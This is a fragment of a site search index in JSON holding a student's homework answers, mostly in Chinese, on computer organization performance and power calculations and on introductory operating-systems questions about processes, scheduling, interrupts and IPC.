1.25$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#b","title":"b)","text":"<p>\u8bbe$ f = \\frac{1}{T} $\uff0c\u5229\u7528\u4e0a\u8ff0\u516c\u5f0f\uff0c\u5f97\uff1a $$ \\frac{CPI_A}{CPI_B} = \\frac{I_B \\cdot T_{PB}}{I_A \\cdot T_{PA}}\\     \\Rightarrow \\frac{1.1}{1.25} = \\frac{1.2 f_{PA}}{1.0 f_{PB}}\\     \\Rightarrow \\frac{f_{PA}}{f_{PB}} = 0.733 $$ \u7b54\uff1a\u5904\u7406\u5668 A \u7684\u65f6\u949f\u9891\u7387\u4e3a\u5904\u7406\u5668 B \u7684 0.733 \u500d</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#c","title":"c)","text":"<p>\u4ecd\u5047\u8bbe cpu \u65f6\u949f\u5468\u671f\u4e3a 1ns\uff0c$ t_{new} = 6.0 \\times 10^8 \\times 1.1 \\times 1ns = 0.66s $</p> <p>\u5bf9\u4e8e A: $ \u52a0\u901f\u6bd4 = (1.1 - 0.66)/1.1 = 40\\% $ \u5bf9\u4e8e B\uff1a$ \u52a0\u901f\u6bd4 = (1.5 - 0.66)/1.5 = 29.3\\% $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-18","title":"Exercise 1.8","text":"","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#181","title":"1.8.1","text":"<p>\u8bbe P \u4e3a\u529f\u8017\uff0cC \u4e3a\u8d1f\u8f7d\u7535\u5bb9\uff0cV \u4e3a\u7535\u538b\uff0cf \u4e3a\u5f00\u5173\u9891\u7387\uff0c\u52a8\u6001\u529f\u8017\u516c\u5f0f\uff1a $$     P = C \\cdot U^2 \\cdot f $$ $ C_{Pentium 4} = \\frac{90}{1.25^2 \\times 3.6 \\times 10^6} = 16 \\mu F$ $ C_{Core i5} = \\frac{40}{0.9^2 \\times 3.4 \\times 10^6} \\approx  14.5 \\mu F$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#182","title":"1.8.2","text":"<p>$ \u8bbe p1 \u4e3a\u9759\u6001\u529f\u8017\u5360\u603b\u529f\u8017\u7684\u6bd4\u4f8b\uff0cp2 \u4e3a\u9759\u6001\u529f\u8017\u76f8\u5bf9\u4e8e\u52a8\u6001\u529f\u8017\u7684\u6bd4\u4f8b\u3002 $</p> <p>$ Pentium 4: p1 = 10/100 = 10\\%, p2 = 10/90 = 11.1\\%$ $ Core i5: p1 = 30/70 =  42.9\\%, p2 = 30/40 = 75\\%$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#183","title":"1.8.3","text":"\\[ P_\u603b = P_\u52a8 + P_\u9759  =  C \\cdot U^2 \\cdot f + I \\cdot U$$ $ \u56e0\u4e3a I \u4e0d\u53d8\uff0c\u8bbe\u53d8\u5316\u540e\u7684\u7535\u538b\u4e3a U'\uff0ct = \\frac{U'}{U},\u5219\uff1a $ $$ P_\u603b' = P_\u52a8 \\cdot \\left( \\frac{U'}{U} \\right)^2 + P_\u9759 \\cdot \\left( \\frac{U'}{U} \\right) \\\\ \\Rightarrow P_\u603b' = P_\u52a8 \\cdot t^2 + P_\u9759 \\cdot t \\] <p>\u5bf9\u4e8e P4\uff1a $ 90 = 90t^2 + 10t \\Rightarrow t \\approx  0.946 $ \u5bf9\u4e8e i5: $ 63 = 40t^2 + 30t \\Rightarrow t \\approx  0.935$ \u7b54\uff1a\u5bf9\u4e8e P4\uff0c\u7535\u538b\u964d\u4e3a\u539f\u6765\u7684$ 94.6\\% \\(\uff0c\u5bf9\u4e8e i5\uff0c\u7535\u538b\u964d\u4e3a\u539f\u6765\u7684\\) 93.5\\% $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter1-%E4%BD%9C%E4%B8%9A/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e00\u7ae0 \u4f5c\u4e1a","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter1-%E4%BD%9C%E4%B8%9A/#13","title":"1.3","text":"<p>Under what circumstances would a user be better off using a timesharing system rather than a PC or single-user workstation? \u7b54\uff1a\u5f53\u8ba1\u7b97\u673a\u6027\u80fd\u8db3\u591f\u5f3a\u5927\u7684\u65f6\u5019\uff0c\u91c7\u7528\u5206\u65f6\u7cfb\u7edf\u53ef\u4ee5\u8ba9\u8ba1\u7b97\u673a\u540c\u65f6\u5730\uff0c\u5feb\u901f\u5730\uff0c\u4e3a\u8bb8\u591a\u7528\u6237\u89e3\u51b3\u590d\u6742\u7684\u95ee\u9898\uff0c\u5e76\u4f7f\u5f97\u8ba1\u7b97\u8d44\u6e90\u5f97\u5230\u5145\u5206\u7684\u5229\u7528\u3002\u6b64\u65f6\u82e5\u8ba9\u6bcf\u4e2a\u7528\u6237\u4f7f\u7528 pc \u673a\u53bb\u89e3\u51b3\u95ee\u9898\u4f1a\u9700\u8981\u5f88\u4e45\uff0c\u800c\u7ed9\u4f7f\u7528\u5de5\u4f5c\u7ad9\u6210\u672c\u53c8\u592a\u9ad8\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter1-%E4%BD%9C%E4%B8%9A/#15","title":"1.5","text":"<p>Describe the differences between symmetric and asymmetric multiprocessing. What are three advantages and one disadvantage of multiprocessor systems? \u7b54\uff1a</p> <ol> <li>\u533a\u522b\uff1a</li> </ol> <ul> <li>\u5bf9\u79f0\u591a\u5904\u7406\u5668\u4e2d\u7684\u6bcf\u4e2a\u6838\u5bf9\u4e8e\u7a0b\u5e8f\u6765\u8bb2\u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u800c\u975e\u5bf9\u79f0\u591a\u5904\u7406\u7684\u6bcf\u4e2a\u6838\u90fd\u6709\u81ea\u5df1\u64c5\u957f\u5904\u7406\u7684\u7279\u5b9a\u7684\u8ba1\u7b97\u4efb\u52a1\uff0c\u662f\u4e0d\u540c\u7684\u3002</li> <li>\u5bf9\u79f0\u591a\u5904\u7406\u5668\u4e2d\u7684\u6bcf\u4e2a\u6838\u90fd\u53ef\u4ee5\u8fdb\u884c I/O \u64cd\u4f5c\uff0c\u800c\u975e\u5806\u6210\u4e2d\u591a\u5904\u7406\u4e2d\uff0c\u6709\u4e00\u4e2a\u4e3b\u6838\u63a7\u5236\u5176\u5b83\u4ece\u6838\uff0c\u901a\u5e38\u53ea\u6709\u4e3b\u6838\u6267\u884c I/O \u64cd\u4f5c\u3002</li> </ul> <ol> <li>\u4f18\u7f3a\u70b9\uff1a</li> </ol> <ul> <li> <p>\u4f18\u70b9\uff1a</p> <ol> <li>\u5229\u7528\u4e86\u5e76\u884c\u6027\uff0c\u589e\u52a0\u4e86\u7cfb\u7edf\u7684\u541e\u5410\u91cf\u3002</li> <li>\u56e0\u4e3a\u4e0d\u540c cpu \u5171\u4eab\u5916\u8bbe\uff0c\u5927\u5bb9\u91cf\u5b58\u50a8\u548c\u7535\u6e90\u7b49\u8d44\u6e90\uff0c\u56e0\u6b64\u66f4\u52a0\u7ecf\u6d4e\u3002</li> <li>\u56e0\u4e3a\u5373\u4f7f\u4e00\u4e2a cpu \u51fa\u4e86\u95ee\u9898\uff0c\u6574\u4e2a\u7cfb\u7edf\u4ecd\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\uff0c\u56e0\u6b64\u66f4\u52a0\u53ef\u9760\u3002</li> </ol> </li> </ul> <ul> <li> <p>\u7f3a\u70b9\uff1a</p> <ol> <li>\u9700\u8981\u7f16\u7a0b\u4eba\u5458\u7f16\u5199\u5e76\u884c\u6027\u7684\u7a0b\u5e8f\u624d\u80fd\u53d1\u6325\u6548\u679c\uff0c\u589e\u52a0\u7f16\u7a0b\u5de5\u4f5c\u91cf\u3002</li> </ol> </li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter1-%E4%BD%9C%E4%B8%9A/#110","title":"1.10","text":"<p>What is the purpose of interrupts? What are the differences between a trap and an interrupt? Can traps be generated intentionally by a user program? If so, for what purpose? \u7b54\uff1a</p> <ol> <li>\u4e2d\u65ad\u7684\u76ee\u7684\uff1a</li> </ol> <ul> <li>\u4f7f\u7528\u4e2d\u65ad\u8bbf\u95ee I/O \u673a\u5236\uff0c\u53ef\u4ee5\u6d88\u9664 cpu \u5bf9 I/O \u8bbe\u5907\u7684\u8f6e\u8be2\uff0c\u51cf\u5c11 cpu \u7684\u7b49\u5f85\u65f6\u95f4\u3002</li> <li>\u901a\u8fc7\u4e2d\u65ad\u66f4\u5bb9\u6613\u5bf9\u5916\u8bbe\u8fdb\u884c\u54cd\u5e94\uff0c\u5982\u6309\u4e0b\u952e\u76d8\u4f1a\u4ea7\u751f\u4e00\u4e2a\u4e2d\u65ad\uff0c\u8ba1\u7b97\u673a\u5904\u7406\u8fd9\u4e2a\u4e2d\u65ad\u4fbf\u4f1a\u8df3\u8f6c\u5230\u54cd\u5e94\u5904\u7406\u7a0b\u5e8f\u3002</li> </ul> <ol> <li>\u4e2d\u65ad\u662f\u786c\u4ef6\u4ea7\u751f\u7684\uff0c\u9677\u9631\uff08trap\uff09\u662f\u8f6f\u4ef6\u4ea7\u751f\u7684\u3002</li> <li>\u53ef\u4ee5\uff0c\u5982\u8f6f\u4ef6\u9700\u8981\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u65f6\u3002</li> </ol>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter2-%E4%BD%9C%E4%B8%9A.md/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e8c\u7ae0 \u4f5c\u4e1a","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter2-%E4%BD%9C%E4%B8%9A.md/#22","title":"2.2","text":"<p>List five services provided by an operating system that are designed to make it more convenient for users to use the computer system. In what cases it would be impossible for user-level programs to provide these services? Explain.</p> <p>1 \u7a0b\u5e8f\u6267\u884c \u670d\u52a1\uff1a\u64cd\u4f5c\u7cfb\u7edf\u5c06\u7a0b\u5e8f\u88c5\u8f7d\u5165\u5185\u5b58\u5e76\u6267\u884c\u7a0b\u5e8f\u3002 \u82e5\u4f7f\u7528\u7528\u6237\u7a0b\u5e8f\u63d0\u4f9b\u8be5\u670d\u52a1\uff0c\u5219\u5f88\u6709\u53ef\u80fd\u5e26\u6765\u5b89\u5168\u9690\u60a3\uff0c\u56e0\u4e3a\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u88c5\u8f7d\u975e\u6cd5\u7a0b\u5e8f\u3002</p> <p>2 I/O \u64cd\u4f5c \u670d\u52a1\uff1a\u7cfb\u7edf\u63d0\u4f9b\u65b9\u4fbf\u64cd\u4f5c I/O \u8bbe\u5907\u7684\u65b9\u6cd5\u3002 \u82e5\u4f7f\u7528\u7528\u6237\u7a0b\u5e8f\u63d0\u4f9b\u8be5\u670d\u52a1\uff0c\u5728\u591a\u7528\u6237\u7cfb\u7edf\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u7a83\u53d6\u5176\u5b83\u7528\u6237\u5b58\u50a8\u5728\u786c\u76d8\u91cc\u7684\u6570\u636e\u3002</p> <p>3 \u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c \u670d\u52a1\uff1a\u63d0\u4f9b\u6587\u4ef6\u7684\uff0c\u521b\u5efa\u3001\u5220\u9664\u3001\u641c\u7d22\u3001\u83b7\u53d6\u4fe1\u606f\u65b9\u6cd5\uff0c\u5e76\u63d0\u4f9b\u8bbf\u95ee\u6743\u9650\u7ba1\u7406\u3002 \u540c\u6837\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u975e\u6cd5\u8bbf\u95ee\u6587\u4ef6\u3002</p> <p>4 \u901a\u4fe1 \u670d\u52a1\uff1a\u63d0\u4f9b\u8fdb\u7a0b\u95f4\u7684\u76f8\u4e92\u901a\u4fe1\u3002\uff08\u540c\u4e00\u8ba1\u7b97\u673a\u5185\u7684\u4e0d\u540c\u8fdb\u7a0b\u6216\u901a\u8fc7\u7f51\u7edc\u94fe\u63a5\u7684\u4e0d\u540c\u8ba1\u7b97\u673a\u7684\u8fdb\u7a0b\uff09 \u540c\u6837\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u975e\u6cd5\u7a83\u542c\u5176\u5b83\u5e94\u7528\u7684\u4fe1\u606f\u3002</p> <p>5 \u9519\u8bef\u68c0\u6d4b \u670d\u52a1\uff1a\u5bf9\u4e8e\u53d1\u751f\u5728\u786c\u4ef6\u4e0a\u6216\u7528\u6237\u7a0b\u5e8f\u4e2d\u7684\u9519\u8bef\uff0c\u64cd\u4f5c\u7cfb\u7edf\u91c7\u53d6\u9002\u5f53\u7684\u5904\u7406\u63aa\u65bd\u3002 \u82e5\u4f7f\u7528\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u8be5\u670d\u52a1\uff0c\u5219\u5e94\u7528\u7a0b\u5e8f\u5728\u7f16\u5199\u65f6\u9700\u8981\u8003\u8651\u6240\u6709\u53ef\u80fd\u7684\u9519\u8bef\uff0c\u8fd9\u662f\u4e0d\u73b0\u5b9e\u7684\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter2-%E4%BD%9C%E4%B8%9A.md/#25","title":"2.5","text":"<p>What are the five major activities of an operating system in regard to file management?</p> <ul> <li>\u6587\u4ef6\u7684\u521b\u5efa\u548c\u5220\u9664</li> <li>\u6587\u4ef6\u7684\u6253\u5f00\u548c\u5173\u95ed</li> <li>\u6587\u4ef6\u7684\u8bfb\u3001\u5199\u3001\u91cd\u5b9a\u4f4d</li> <li>\u8bfb\u53d6\u6587\u4ef6\u5c5e\u6027\u548c\u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027</li> <li>\u6587\u4ef6\u7684\u6743\u9650\u7ba1\u7406</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter2-%E4%BD%9C%E4%B8%9A.md/#28","title":"2.8","text":"<p>What are the two models of interprocess communication? What are the strengths and weaknesses of the two approaches?</p> <p>1 \u5171\u4eab\u5185\u5b58 (shared-memory model) \u4f18\u70b9\uff1a</p> <ul> <li>\u901f\u5ea6\u5feb</li> <li>\u8bbf\u95ee\u6570\u636e\u65b9\u4fbf</li> </ul> <p>\u7f3a\u70b9\uff1a</p> <ul> <li>\u4e0d\u6613\u8fdb\u884c\u6570\u636e\u7684\u4fdd\u62a4\u548c\u540c\u6b65</li> </ul> <p>2 \u6d88\u606f (message-passing model) \u4f18\u70b9\uff1a</p> <ul> <li>\u4e0d\u5fc5\u907f\u514d\u51b2\u7a81</li> <li>\u8ba1\u7b97\u673a\u95f4\u901a\u4fe1\u65f6\uff0c\u66f4\u5bb9\u6613\u5b9e\u73b0</li> </ul> <p>\u7f3a\u70b9\uff1a</p> <ul> <li>\u5927\u91cf\u6570\u636e\u4f20\u8f93\u65f6\uff0c\u901f\u5ea6\u6162</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e09\u7ae0 \u4f5c\u4e1a","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#31","title":"3.1","text":"<p>Describe the differences among short-term, medium-term, and long-term scheduling.</p> <ul> <li>\u77ed\u671f\u8c03\u5ea6 \u4ece\u5185\u5b58\u4e2d\u7684\u5c31\u7eea\u961f\u5217\u91cc\u9009\u62e9\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u3002\u6267\u884c\u6700\u4e3a\u9891\u7e41\uff0c\u4e3a\u4fdd\u8bc1\u6267\u884c\u65f6\u95f4\u77ed\uff0c\u56e0\u800c\u8c03\u5ea6\u7b97\u6cd5\u4e0d\u80fd\u592a\u590d\u6742\u3002</li> <li>\u957f\u671f\u8c03\u5ea6 \u4e5f\u79f0\u4e3a\u5de5\u4f5c\u8c03\u5ea6\uff0c\u51b3\u5b9a\u4ece\u78c1\u76d8\u4e2d\u5c06\u54ea\u4e9b\u8fdb\u7a0b\u653e\u5165\u5185\u5b58\u3002\u56e0\u4e3a\u6267\u884c\u5f88\u4e0d\u9891\u7e41\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u66f4\u590d\u6742\u7684\u8c03\u5ea6\u7b97\u6cd5\uff0c\u4ece\u800c\u4f7f\u5185\u5b58\u4e2d\u8fdb\u7a0b\u7684 CPU \u4f7f\u7528\u548c I/O \u4f7f\u7528\u66f4\u5747\u8861\uff0c\u8d44\u6e90\u5229\u7528\u7387\u66f4\u9ad8\u3002</li> <li>\u4e2d\u671f\u8c03\u5ea6 \u6709\u4ea4\u6362\u7684\u673a\u5236\uff0c\u5373\u5c06\u8fdb\u7a0b\u4ece\u5185\u5b58\u4e2d\u79fb\u9664\uff0c\u5e76\u5728\u9002\u5f53\u65f6\u95f4\u518d\u6b21\u5c06\u5176\u8c03\u5165\u5185\u5b58\u3002\u8fd9\u6709\u52a9\u4e8e\u52a8\u6001\u6539\u5584\u8fdb\u7a0b\u7ec4\u5408\uff0c\u4f7f CPU \u548c I/O \u4f7f\u7528\u66f4\u5747\u8861\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#32","title":"3.2","text":"<p>Describe the actions taken by a kernel to context-switch between processes.</p> <p>\u8fdb\u7a0b\u95f4\u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u5373\u5207\u6362\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u65f6\u9700\u8981\u4fdd\u7559\u5f53\u524d\u8fdb\u7a0b\u7684\u72b6\u6001\u5e76\u6062\u590d\u53e6\u4e00\u8fdb\u7a0b\u7684\u72b6\u6001\u3002\u8fd9\u4e9b\u72b6\u6001\u53ef\u4ee5\u7528 PCB \u5373\u8fdb\u7a0b\u63a7\u5236\u5757\u8868\u793a\uff0c\u5305\u542b\u8fdb\u7a0b\u72b6\u6001\uff0c\u7a0b\u5e8f\u8ba1\u6570\u5668\uff0cCPU \u5bc4\u5b58\u5668\u7b49\u4fe1\u606f\u3002\u4e0a\u4e0b\u6587\u5207\u6362\u65f6\uff0c\u4e3b\u8981\u6267\u884c\u4e00\u4e2a\u72b6\u6001\u4fdd\u5b58\u548c\u72b6\u6001\u6062\u590d\u8fc7\u7a0b\uff0c\u53ef\u80fd\u8fd8\u8981\u6267\u884c\u4e00\u4e9b\u4f53\u7cfb\u7ed3\u6784\u6709\u5173\u7684\u64cd\u4f5c\u6bd4\u5982\u6e05\u9664 cache \u7b49\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3a","title":"3.A","text":"<p>Consider a computer with N processors in a multiprocessor configuration.</p> <p>a. How many processes can be in each of the Ready, Running, and Waiting states at one time? \u7b54\uff1a\u82e5\u5e72\u4e2a\u5c31\u7eea\u9636\u6bb5\uff0c\u4e0d\u8d85\u8fc7 N \u4e2a\u6267\u884c\u9636\u6bb5\uff0c\u82e5\u5e72\u4e2a\u7b49\u5f85\u9636\u6bb5\u3002 b. What is the minimum number of processes that can be in each of the Ready, Running, and Waiting states at one time? \u7b54\uff1a\u6700\u5c11\u5f53\u7136\u90fd\u662f 0 \u4e2a\uff1f</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3b","title":"3.B","text":"<p>Please explain the five states of a process.</p> <ul> <li>new: \u8fdb\u7a0b\u521a\u88ab\u521b\u5efa\u65f6\uff0c\u5904\u4e8e\u6b64\u9636\u6bb5\u3002\u5982 linux \u4e2d fork \u7cfb\u7edf\u8c03\u7528\u521b\u5efa\u65b0\u8fdb\u7a0b\u65f6\u3002</li> </ul> <ul> <li>ready: \u8fdb\u7a0b\u6267\u884c\u7b49\u5f85\u88ab\u5206\u914d\u5230 CPU \u4e2d\u6267\u884c\u3002</li> </ul> <ul> <li>run: \u8fdb\u7a0b\u6b63\u5728\u88ab\u6267\u884c\u3002</li> </ul> <ul> <li>waiting: \u8fdb\u7a0b\u7531\u4e8e\u9700\u8981\u7b49\u5f85 I/O \u7b49\u8bbe\u5907\u7684\u6570\u636e\uff0c\u800c\u4e0d\u80fd\u6267\u884c\uff0c\u88ab\u653e\u7f6e\u5bf9\u5e94\u8bbe\u5907\u7684\u7b49\u5f85\u961f\u5217\u4e2d\u3002</li> </ul> <ul> <li>terminated: \u8fdb\u7a0b\u6267\u884c\u7ed3\u675f\uff0c\u6b63\u5728\u91ca\u653e\u8fdb\u7a0b\u7684 PCB\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3c","title":"3.C","text":"<p>what is the role of PCB in OS? What information is contained in PCB? \u64cd\u4f5c\u7cfb\u7edf\u5bf9\u8fdb\u7a0b\u7684\u521b\u5efa\u3001\u5220\u9664\u3001\u8c03\u5ea6\u90fd\u662f\u901a\u8fc7\u5bf9 PCB \u7684\u64cd\u4f5c\u6765\u5b8c\u6210\u7684\u3002 PCB \u5305\u542b\uff1a</p> <ul> <li>\u8fdb\u7a0b\u72b6\u6001</li> <li>\u7a0b\u5e8f\u8ba1\u6570\u5668</li> <li>cpu \u5bc4\u5b58\u5668</li> <li>cpu \u8c03\u5ea6\u4fe1\u606f\uff1a\u5982\u8fdb\u7a0b\u4f18\u5148\u7ea7\uff0c\u8c03\u5ea6\u961f\u5217\u6307\u9488\u7b49\u3002</li> <li>\u5185\u5b58\u7ba1\u7406\u4fe1\u606f\uff1a\u57fa\u5740\uff0c\u9875\u8868\u6216\u6bb5\u8868\u7b49\u3002</li> <li>accounting info: cpu \u65f6\u95f4\u65f6\u95f4\uff0c\u65f6\u95f4\u754c\u9650\uff0c\u8fdb\u7a0b\u6570\u7b49\u3002</li> <li>I/O \u72b6\u6001\u4fe1\u606f\uff1a\u5206\u914d\u7684 I/O \u5217\u8868\uff0c\u6253\u5f00\u7684\u6587\u4ef6\u5217\u8868\u7b49\u5f85\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3d","title":"3.D","text":"<p>When a process is created, the operating system needs to be done?</p> <ul> <li>\u7ed9\u65b0\u8fdb\u7a0b\u5206\u914d\u7269\u7406\u548c\u903b\u8f91\u8d44\u6e90\uff08CPU \u65f6\u95f4\uff0c\u5185\u5b58\uff0c\u6587\u4ef6\uff0cI/O \u8bbe\u5907\uff0c\u53ef\u6765\u81ea\u64cd\u4f5c\u7cfb\u7edf\u6216\u7ee7\u627f\u7236\u8fdb\u7a0b\u8d44\u6e90\uff09</li> <li>\u4f20\u9012\u521d\u59cb\u5316\u6570\u636e</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3e","title":"3.E","text":"<p>Please list the differences between message passing system and shared memory system.</p> <ul> <li>\u5171\u4eab\u5185\u5b58\u7cfb\u7edf\u57fa\u672c\u53ea\u80fd\u5728\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\uff08\u53ef\u591a\u6838\uff09\u4e24\u8fdb\u7a0b\u4f20\u9012\u4fe1\u606f\uff0c\u800c\u4fe1\u606f\u4f20\u9012\u7cfb\u7edf\u65e2\u53ef\u4ee5\u662f\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\u4e5f\u53ef\u4ee5\u662f\u901a\u8fc7\u7f51\u7edc\u8fde\u63a5\u7684\u4e0d\u540c\u8ba1\u7b97\u673a\u95f4\u8fdb\u7a0b\u4f20\u9012\u4fe1\u606f\u3002</li> <li>\u5171\u4eab\u5185\u5b58\u7cfb\u7edf\u53ea\u9700\u4e3a\u8fdb\u7a0b\u5206\u914d\u5171\u4eab\u5185\u5b58\uff0c\u901a\u4fe1\u7531\u8fdb\u7a0b\u8d1f\u8d23\uff0c\u800c\u4fe1\u606f\u4f20\u9012\u7cfb\u7edf\u9700\u8981\u64cd\u4f5c\u7cfb\u7edf\u53c2\u4e0e\u8fdb\u884c\u8fdb\u7a0b\u95f4\u7684\u4fe1\u606f\u4f20\u9012\u3002</li> 